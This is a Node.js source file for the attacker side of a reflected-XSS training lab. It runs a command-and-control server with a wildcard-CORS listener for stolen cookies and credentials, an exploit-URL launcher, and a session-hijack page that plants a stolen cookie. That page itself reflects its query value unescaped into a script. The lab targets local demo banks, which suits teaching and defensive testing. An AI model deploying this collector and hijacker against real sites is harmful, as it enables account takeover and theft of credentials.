/**
 * Attacker Command & Control (C2) Server & Dashboard
 * Run: node src/app_attacker.js   -> http://127.0.0.1:5002
 *
 * Provides:
 *   - Live Exfiltration Listener (/log) with CORS support
 *   - Real-Time Server-Sent Events (SSE) log feed
 *   - Weaponized Exploit Generator & One-Click Attack Launcher
 *   - Stolen Session Replay & Victim Impersonation Tester
 */
const express = require('express');
const path = require('path');
const store = require('./lib/store');
const { vectors, getExploitUrl } = require('../payloads');

const app = express();
const PORT = 5002;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Enable CORS for all incoming exfiltration requests
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

/**
 * C2 Listener Endpoint: /log
 * Accepts exfiltrated data via GET query param or POST body.
 */
app.all('/log', (req, res) => {
  const data = req.query.data || req.body?.data || (typeof req.body === 'string' ? req.body : '') || '';
  const clientMeta = {
    ip: req.ip || req.socket.remoteAddress || '127.0.0.1',
    userAgent: req.headers['user-agent'] || 'Unknown',
    origin: req.headers.origin || req.headers.referer || 'http://127.0.0.1:5000',
    method: req.method,
    source: 'C2-Listener-:5002'
  };

  const record = store.push(data, clientMeta);
  console.log(`[C2 LISTENER] Captured ${record.category}: "${record.summary}" from ${clientMeta.ip}`);

  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send(`EXFILTRATION_RECEIVED:${record.id}`);
});

/**
 * Server-Sent Events (SSE) Endpoint for real-time live dashboard updates.
 */
app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  // Send initial handshake
  res.write(`data: ${JSON.stringify({ type: 'INIT', count: store.count() })}\n\n`);

  // Subscribe to new logs
  const unsubscribeNew = store.onNewLog((record) => {
    res.write(`data: ${JSON.stringify({ type: 'LOG', record })}\n\n`);
  });

  const unsubscribeClear = store.onClear(() => {
    res.write(`data: ${JSON.stringify({ type: 'CLEAR' })}\n\n`);
  });

  req.on('close', () => {
    unsubscribeNew();
    unsubscribeClear();
  });
});

/**
 * REST API for log inspection and clearing
 */
app.get('/api/logs', (req, res) => {
  res.json({ count: store.count(), logs: store.all() });
});

app.post('/api/clear', (req, res) => {
  store.clear();
  res.json({ success: true, message: 'All exfiltration logs cleared' });
});

/**
 * Exploit Launcher Route: /launch/:vector
 * Simulates victim clicking a malicious link.
 * Query param ?target=5001 can test against the patched server.
 */
app.get('/launch/:vector', (req, res) => {
  const targetPort = req.query.target === '5001' ? '5001' : '5000';
  const targetOrigin = `http://127.0.0.1:${targetPort}`;
  const vectorKey = req.params.vector;

  const exploitUrl = getExploitUrl(vectorKey, targetOrigin);
  if (!exploitUrl) {
    return res.status(404).send('Unknown vector: ' + vectorKey);
  }

  res.redirect(302, exploitUrl);
});

/**
 * Session Hijacker Tester: /hijack
 * Injects a stolen session cookie into the browser and redirects to SecureBank,
 * proving complete account takeover.
 */
app.get('/hijack', (req, res) => {
  const sessionid = req.query.sessionid || 'mock-session-12345';
  const targetPort = req.query.port || '5000';

  // Inject session cookie into browser context and redirect
  res.cookie('sessionid', sessionid, {
    httpOnly: false,
    sameSite: false,
    secure: false,
    path: '/'
  });

  res.send(`<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Hijacking Session...</title>
  <style>
    body { background: #0b0f19; color: #10b981; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .card { background: #131b2e; border: 1px solid #10b981; padding: 2rem; border-radius: 8px; text-align: center; max-width: 500px; }
  </style>
</head>
<body>
  <div class="card">
    <h2>⚡ SESSION HIJACK IN PROGRESS</h2>
    <p>Injecting stolen cookie: <b>sessionid=${sessionid}</b></p>
    <p>Redirecting to victim bank dashboard...</p>
    <script>
      document.cookie = 'sessionid=${sessionid}; path=/';
      setTimeout(function() {
        window.location.href = 'http://127.0.0.1:${targetPort}/';
      }, 1000);
    </script>
  </div>
</body>
</html>`);
});

/**
 * Attacker Dashboard UI
 */
app.get('/', (req, res) => {
  const currentLogs = store.all();

  const exploitLinks = {
    vector_a_vuln: getExploitUrl('vector_a', 'http://127.0.0.1:5000'),
    vector_a_sec: getExploitUrl('vector_a', 'http://127.0.0.1:5001'),
    vector_b_vuln: getExploitUrl('vector_b', 'http://127.0.0.1:5000'),
    vector_b_sec: getExploitUrl('vector_b', 'http://127.0.0.1:5001'),
    vector_c_vuln: getExploitUrl('vector_c', 'http://127.0.0.1:5000'),
    vector_c_sec: getExploitUrl('vector_c', 'http://127.0.0.1:5001'),
    poc_vuln: getExploitUrl('poc', 'http://127.0.0.1:5000'),
    poc_sec: getExploitUrl('poc', 'http://127.0.0.1:5001')
  };

  const html = `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Attacker C2 Command Center — Reflected XSS Lab</title>
  <style>
    :root {
      --bg: #090d16;
      --card-bg: #111827;
      --card-border: #1f293d;
      --text: #f1f5f9;
      --muted: #94a3b8;
      --accent: #10b981;
      --accent-glow: rgba(16, 185, 129, 0.2);
      --danger: #ef4444;
      --warning: #f59e0b;
      --cyan: #06b6d4;
      --purple: #a855f7;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      line-height: 1.5;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* Top Banner */
    .c2-header {
      background: #0f172a;
      border-bottom: 1px solid #1e293b;
      padding: 1rem 2rem;
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
    }
    .header-content {
      max-width: 1400px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 1rem;
    }
    .c2-brand {
      display: flex;
      align-items: center;
      gap: 0.75rem;
    }
    .skull-icon {
      font-size: 1.75rem;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.08); opacity: 0.85; }
    }
    .c2-title h1 {
      font-size: 1.25rem;
      font-weight: 800;
      letter-spacing: -0.025em;
      color: #fff;
    }
    .c2-title span {
      font-size: 0.75rem;
      font-family: monospace;
      color: var(--accent);
      background: rgba(16, 185, 129, 0.1);
      padding: 0.15rem 0.5rem;
      border-radius: 4px;
      border: 1px solid rgba(16, 185, 129, 0.3);
    }
    .status-group {
      display: flex;
      align-items: center;
      gap: 1.5rem;
      font-family: monospace;
      font-size: 0.85rem;
    }
    .status-pill {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.35rem 0.8rem;
      border-radius: 999px;
      background: #1e293b;
      border: 1px solid #334155;
    }
    .status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: var(--accent);
      box-shadow: 0 0 8px var(--accent);
      animation: blink 1.5s infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }

    /* Main Container */
    .c2-container {
      max-width: 1400px;
      width: 100%;
      margin: 1.5rem auto;
      padding: 0 1.5rem;
      flex: 1;
      display: grid;
      grid-template-columns: 1fr;
      gap: 1.5rem;
    }
    @media (min-width: 1024px) {
      .c2-container {
        grid-template-columns: 460px 1fr;
      }
    }

    /* Cards */
    .c2-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 12px;
      padding: 1.25rem;
      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.2);
      margin-bottom: 1.25rem;
    }
    .c2-card-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid var(--card-border);
      padding-bottom: 0.75rem;
      margin-bottom: 1rem;
    }
    .c2-card-header h2 {
      font-size: 1rem;
      font-weight: 700;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .badge {
      font-size: 0.7rem;
      font-family: monospace;
      padding: 0.2rem 0.5rem;
      border-radius: 4px;
      font-weight: 700;
    }
    .badge-red { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
    .badge-green { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
    .badge-purple { background: rgba(168, 85, 247, 0.15); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.3); }
    .badge-cyan { background: rgba(6, 182, 212, 0.15); color: #22d3ee; border: 1px solid rgba(6, 182, 212, 0.3); }
    .badge-amber { background: rgba(245, 158, 11, 0.15); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.3); }

    /* Vector Section */
    .vector-box {
      background: #0d1322;
      border: 1px solid #1e293b;
      border-radius: 8px;
      padding: 1rem;
      margin-bottom: 1rem;
      transition: border-color 0.2s;
    }
    .vector-box:hover {
      border-color: #334155;
    }
    .vector-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 0.5rem;
    }
    .vector-title {
      font-size: 0.9rem;
      font-weight: 700;
      color: #fff;
    }
    .vector-desc {
      font-size: 0.8rem;
      color: var(--muted);
      margin-bottom: 0.75rem;
      line-height: 1.4;
    }
    .vector-actions {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
    }

    /* Buttons */
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
      padding: 0.45rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      text-decoration: none;
      cursor: pointer;
      transition: all 0.15s ease;
      font-family: inherit;
      border: 1px solid transparent;
    }
    .btn-red {
      background: #b91c1c;
      color: #fff;
    }
    .btn-red:hover {
      background: #dc2626;
      box-shadow: 0 0 10px rgba(220, 38, 38, 0.4);
    }
    .btn-outline {
      background: transparent;
      border-color: #334155;
      color: #94a3b8;
    }
    .btn-outline:hover {
      background: #1e293b;
      color: #fff;
      border-color: #475569;
    }
    .btn-accent {
      background: var(--accent);
      color: #042f1a;
      font-weight: 700;
    }
    .btn-accent:hover {
      background: #34d399;
      box-shadow: 0 0 10px var(--accent-glow);
    }
    .btn-cyan {
      background: rgba(6, 182, 212, 0.15);
      border-color: rgba(6, 182, 212, 0.4);
      color: #22d3ee;
    }
    .btn-cyan:hover {
      background: rgba(6, 182, 212, 0.25);
    }

    /* Payload snippet drawer */
    details {
      margin-top: 0.5rem;
      background: #090e17;
      border-radius: 6px;
      border: 1px solid #1e293b;
      padding: 0.4rem 0.75rem;
      font-size: 0.75rem;
    }
    summary {
      cursor: pointer;
      color: #64748b;
      font-family: monospace;
      user-select: none;
    }
    summary:hover { color: #94a3b8; }
    .code-preview {
      margin-top: 0.5rem;
      padding: 0.5rem;
      background: #050811;
      border-radius: 4px;
      color: #a5f3fc;
      font-family: monospace;
      white-space: pre-wrap;
      word-break: break-all;
      max-height: 140px;
      overflow-y: auto;
    }

    /* Log Stream Feed */
    .log-stream-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 1rem;
      flex-wrap: wrap;
      gap: 0.5rem;
    }
    .log-controls {
      display: flex;
      gap: 0.5rem;
    }
    .log-list {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
      max-height: calc(100vh - 220px);
      overflow-y: auto;
      padding-right: 0.25rem;
    }
    .log-entry {
      background: #0d1322;
      border: 1px solid #1e293b;
      border-radius: 8px;
      padding: 1rem;
      transition: all 0.2s ease;
      animation: fadeIn 0.3s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-8px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .log-entry.is-new {
      border-color: var(--accent);
      box-shadow: 0 0 12px var(--accent-glow);
    }
    .log-entry-top {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 0.5rem;
    }
    .log-time {
      font-family: monospace;
      font-size: 0.75rem;
      color: #64748b;
    }
    .log-main {
      font-size: 0.9rem;
      font-weight: 600;
      color: #fff;
      margin-bottom: 0.5rem;
    }
    .log-details-box {
      background: #060a12;
      border: 1px solid #1a2336;
      border-radius: 6px;
      padding: 0.75rem;
      font-family: monospace;
      font-size: 0.8rem;
      margin-top: 0.5rem;
      word-break: break-all;
    }
    .detail-row {
      display: flex;
      gap: 0.5rem;
      margin-bottom: 0.25rem;
    }
    .detail-label {
      color: #64748b;
      min-width: 80px;
    }
    .detail-val {
      color: #38bdf8;
      font-weight: 600;
    }
    .empty-logs {
      text-align: center;
      padding: 3rem 1rem;
      color: #64748b;
      font-family: monospace;
      border: 2px dashed #1e293b;
      border-radius: 8px;
    }

    /* Toast */
    .toast-popup {
      position: fixed;
      bottom: 24px;
      right: 24px;
      background: #042f1a;
      border: 1px solid #10b981;
      color: #ecfdf5;
      padding: 1rem 1.5rem;
      border-radius: 8px;
      font-weight: 600;
      font-size: 0.9rem;
      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5);
      z-index: 99999;
      display: none;
      animation: popIn 0.2s ease;
    }
    @keyframes popIn {
      from { transform: translateY(20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
  </style>
</head>
<body>

<header class="c2-header">
  <div class="header-content">
    <div class="c2-brand">
      <span class="skull-icon">💀</span>
      <div class="c2-title">
        <h1>SHADOW_C2 // ATTACKER COMMAND CONSOLE</h1>
        <span>EXFILTRATION LISTENER ACTIVE &bull; 127.0.0.1:5002/log</span>
      </div>
    </div>
    <div class="status-group">
      <div class="status-pill">
        <span class="status-dot"></span>
        <span id="sse-status" style="color:#10b981">LIVE STREAM CONNECTED</span>
      </div>
      <div class="status-pill">
        <span>Captured Artifacts: <b id="log-count" style="color:#38bdf8">${currentLogs.length}</b></span>
      </div>
      <a href="http://127.0.0.1:5000" target="_blank" class="btn btn-outline" style="font-size:0.75rem;">
        🏦 Target Bank (:5000)
      </a>
      <a href="http://127.0.0.1:5001" target="_blank" class="btn btn-outline" style="font-size:0.75rem;">
        🛡️ Patched Bank (:5001)
      </a>
    </div>
  </div>
</header>

<div class="c2-container">

  <!-- LEFT: Exploit Generator & Launchpad -->
  <div class="c2-col">
    <div class="c2-card">
      <div class="c2-card-header">
        <h2>🚀 Exploit Launchpad</h2>
        <span class="badge badge-red">Weaponized Payloads</span>
      </div>
      <p style="font-size:0.8rem;color:var(--muted);margin-bottom:1rem;">
        Click <b>"Launch (Simulate Victim)"</b> to open the crafted malicious search URL in a new tab. Watch the exfiltrated data arrive live in the right column!
      </p>

      <!-- Vector A -->
      <div class="vector-box">
        <div class="vector-header">
          <span class="vector-title">Vector A — Session Cookie Hijack</span>
          <span class="badge badge-red">Critical Impact</span>
        </div>
        <p class="vector-desc">
          Exploits unescaped search reflection to steal <span style="color:#38bdf8;font-family:monospace">sessionid</span> (no HttpOnly) and exfiltrates it to C2.
        </p>
        <div class="vector-actions">
          <a href="/launch/vector_a" target="_blank" class="btn btn-red">
            🎯 Launch (Port 5000)
          </a>
          <a href="/launch/vector_a?target=5001" target="_blank" class="btn btn-outline" title="Verify patched defenses">
            🛡️ Test Defense (:5001)
          </a>
          <button class="btn btn-outline copy-btn" data-url="${exploitLinks.vector_a_vuln}">
            📋 Copy URL
          </button>
        </div>
        <details>
          <summary>View Weaponized Payload</summary>
          <div class="code-preview">${escapeHtmlText(vectors.vector_a.payload)}</div>
        </details>
      </div>

      <!-- Vector B -->
      <div class="vector-box">
        <div class="vector-header">
          <span class="vector-title">Vector B — In-Context Phishing Overlay</span>
          <span class="badge badge-purple">Origin Abuse</span>
        </div>
        <p class="vector-desc">
          Injects a pixel-perfect SecureBank "Session Expired" modal covering the victim tab. Harvests credentials live when submitted!
        </p>
        <div class="vector-actions">
          <a href="/launch/vector_b" target="_blank" class="btn btn-red">
            🎯 Launch Modal (Port 5000)
          </a>
          <a href="/launch/vector_b?target=5001" target="_blank" class="btn btn-outline">
            🛡️ Test Defense (:5001)
          </a>
          <button class="btn btn-outline copy-btn" data-url="${exploitLinks.vector_b_vuln}">
            📋 Copy URL
          </button>
        </div>
        <details>
          <summary>View Weaponized Payload</summary>
          <div class="code-preview">${escapeHtmlText(vectors.vector_b.payload)}</div>
        </details>
      </div>

      <!-- Vector C -->
      <div class="vector-box">
        <div class="vector-header">
          <span class="vector-title">Vector C — Silent State Change (CSRF)</span>
          <span class="badge badge-amber">Account Takeover</span>
        </div>
        <p class="vector-desc">
          Executes silent background POST to <span style="color:#38bdf8;font-family:monospace">/settings</span> using the victim's session to change their account email to the attacker's.
        </p>
        <div class="vector-actions">
          <a href="/launch/vector_c" target="_blank" class="btn btn-red">
            🎯 Launch Silent POST (Port 5000)
          </a>
          <a href="/launch/vector_c?target=5001" target="_blank" class="btn btn-outline">
            🛡️ Test Defense (:5001)
          </a>
          <button class="btn btn-outline copy-btn" data-url="${exploitLinks.vector_c_vuln}">
            📋 Copy URL
          </button>
        </div>
        <details>
          <summary>View Weaponized Payload</summary>
          <div class="code-preview">${escapeHtmlText(vectors.vector_c.payload)}</div>
        </details>
      </div>

      <!-- PoC Alert -->
      <div class="vector-box" style="margin-bottom:0;">
        <div class="vector-header">
          <span class="vector-title">Vector 0 — Classic PoC Alert</span>
          <span class="badge badge-cyan">Basic PoC</span>
        </div>
        <p class="vector-desc">
          Executes standard alert dialog showing <span style="font-family:monospace">document.domain</span> to prove script injection.
        </p>
        <div class="vector-actions">
          <a href="/launch/poc" target="_blank" class="btn btn-cyan">
            🎯 Launch PoC Alert (:5000)
          </a>
          <a href="/launch/poc?target=5001" target="_blank" class="btn btn-outline">
            🛡️ Test Defense (:5001)
          </a>
        </div>
      </div>
    </div>
  </div>

  <!-- RIGHT: Real-Time C2 Exfiltration Feed -->
  <div class="c2-col">
    <div class="c2-card" style="min-height: 500px;">
      <div class="log-stream-header">
        <h2>📡 Live Exfiltration Feed</h2>
        <div class="log-controls">
          <button id="btn-clear" class="btn btn-outline" style="font-size:0.75rem;">
            🧹 Clear Logs
          </button>
          <a href="/api/logs" target="_blank" class="btn btn-outline" style="font-size:0.75rem;">
            💾 Export JSON
          </a>
        </div>
      </div>

      <div id="log-list" class="log-list">
        ${renderLogsHtml(currentLogs)}
      </div>
    </div>
  </div>

</div>

<div id="toast" class="toast-popup"></div>

<script>
  // Helper to copy text to clipboard
  function copyText(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(showToast).catch(function() {
        fallbackCopy(text);
      });
    } else {
      fallbackCopy(text);
    }
  }

  function fallbackCopy(text) {
    var ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    showToast();
  }

  function showToast(msg) {
    var t = document.getElementById('toast');
    t.innerText = msg || '📋 Exploit link copied to clipboard!';
    t.style.display = 'block';
    setTimeout(function() { t.style.display = 'none'; }, 2000);
  }

  document.querySelectorAll('.copy-btn').forEach(function(btn) {
    btn.addEventListener('click', function() {
      var url = btn.getAttribute('data-url');
      copyText(url);
    });
  });

  // Clear logs button
  document.getElementById('btn-clear').addEventListener('click', function() {
    if (!confirm('Clear all exfiltration records?')) return;
    fetch('/api/clear', { method: 'POST' }).then(function() {
      document.getElementById('log-list').innerHTML = '<div class="empty-logs">📡 Listening for victim exfiltrations on 127.0.0.1:5002/log...</div>';
      document.getElementById('log-count').innerText = '0';
    });
  });

  // Server-Sent Events (SSE) Listener for Real-Time Live Feed
  function initSSE() {
    var statusEl = document.getElementById('sse-status');
    var listEl = document.getElementById('log-list');
    var countEl = document.getElementById('log-count');

    var es = new EventSource('/events');

    es.onopen = function() {
      statusEl.innerText = 'LIVE STREAM CONNECTED';
      statusEl.style.color = '#10b981';
    };

    es.onerror = function() {
      statusEl.innerText = 'RECONNECTING...';
      statusEl.style.color = '#f59e0b';
    };

    es.onmessage = function(e) {
      try {
        var msg = JSON.parse(e.data);
        if (msg.type === 'LOG') {
          var rec = msg.record;
          // Play visual flash
          showToast('🚨 NEW EXFILTRATION DETECTED: ' + rec.category);
          // Prepend entry to log list
          var entryHtml = buildLogEntryHtml(rec, true);
          var empty = listEl.querySelector('.empty-logs');
          if (empty) empty.remove();
          listEl.insertAdjacentHTML('afterbegin', entryHtml);
          // Increment counter
          var current = parseInt(countEl.innerText, 10) || 0;
          countEl.innerText = current + 1;
        } else if (msg.type === 'CLEAR') {
          listEl.innerHTML = '<div class="empty-logs">📡 Listening for victim exfiltrations on 127.0.0.1:5002/log...</div>';
          countEl.innerText = '0';
        }
      } catch (err) {
        console.error('SSE parse error:', err);
      }
    };
  }

  function buildLogEntryHtml(r, isNew) {
    var badgeClass = 'badge-cyan';
    if (r.category === 'SESSION_COOKIE') badgeClass = 'badge-red';
    else if (r.category === 'CREDENTIALS') badgeClass = 'badge-purple';
    else if (r.category === 'UNAUTHORIZED_ACTION') badgeClass = 'badge-amber';

    var hijackBtn = '';
    if (r.category === 'SESSION_COOKIE' && r.details && r.details.sessionid) {
      hijackBtn = '<div style="margin-top:0.75rem;"><a href="/hijack?sessionid=' + encodeURIComponent(r.details.sessionid) + '" target="_blank" class="btn btn-accent" style="font-size:0.75rem;">⚡ Impersonate Victim (Hijack Session)</a></div>';
    }

    var detailsHtml = '';
    if (r.details) {
      var rows = [];
      for (var k in r.details) {
        rows.push('<div class="detail-row"><span class="detail-label">' + k + ':</span><span class="detail-val">' + escapeHtml(String(r.details[k])) + '</span></div>');
      }
      detailsHtml = '<div class="log-details-box">' + rows.join('') + '</div>';
    }

    return '<div class="log-entry ' + (isNew ? 'is-new' : '') + '">' +
      '<div class="log-entry-top">' +
        '<span class="badge ' + badgeClass + '">' + r.category + '</span>' +
        '<span class="log-time">' + r.formattedTime + ' &bull; ' + r.ip + '</span>' +
      '</div>' +
      '<div class="log-main">' + escapeHtml(r.summary) + '</div>' +
      detailsHtml +
      hijackBtn +
    '</div>';
  }

  function escapeHtml(str) {
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  initSSE();
</script>

</body>
</html>`;

  res.send(html);
});

function escapeHtmlText(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function renderLogsHtml(logs) {
  if (!logs || logs.length === 0) {
    return '<div class="empty-logs">📡 Listening for victim exfiltrations on 127.0.0.1:5002/log...</div>';
  }

  return logs.map(r => {
    let badgeClass = 'badge-cyan';
    if (r.category === 'SESSION_COOKIE') badgeClass = 'badge-red';
    else if (r.category === 'CREDENTIALS') badgeClass = 'badge-purple';
    else if (r.category === 'UNAUTHORIZED_ACTION') badgeClass = 'badge-amber';

    let hijackBtn = '';
    if (r.category === 'SESSION_COOKIE' && r.details && r.details.sessionid) {
      hijackBtn = `<div style="margin-top:0.75rem;">
        <a href="/hijack?sessionid=${encodeURIComponent(r.details.sessionid)}" target="_blank" class="btn btn-accent" style="font-size:0.75rem;">
          ⚡ Impersonate Victim (Hijack Session)
        </a>
      </div>`;
    }

    let detailsHtml = '';
    if (r.details) {
      const rows = Object.entries(r.details)
        .map(([k, v]) => `<div class="detail-row"><span class="detail-label">${escapeHtmlText(k)}:</span><span class="detail-val">${escapeHtmlText(String(v))}</span></div>`)
        .join('');
      detailsHtml = `<div class="log-details-box">${rows}</div>`;
    }

    return `
<div class="log-entry">
  <div class="log-entry-top">
    <span class="badge ${badgeClass}">${r.category}</span>
    <span class="log-time">${r.formattedTime || ''} &bull; ${r.ip || '127.0.0.1'}</span>
  </div>
  <div class="log-main">${escapeHtmlText(r.summary)}</div>
  ${detailsHtml}
  ${hijackBtn}
</div>`;
  }).join('');
}

const HOST = process.env.HOST || '0.0.0.0';
app.listen(PORT, HOST, () => {
  console.log(`[ATTACKER C2] Running on http://${HOST === '0.0.0.0' ? '127.0.0.1' : HOST}:${PORT}`);
});

module.exports = app;
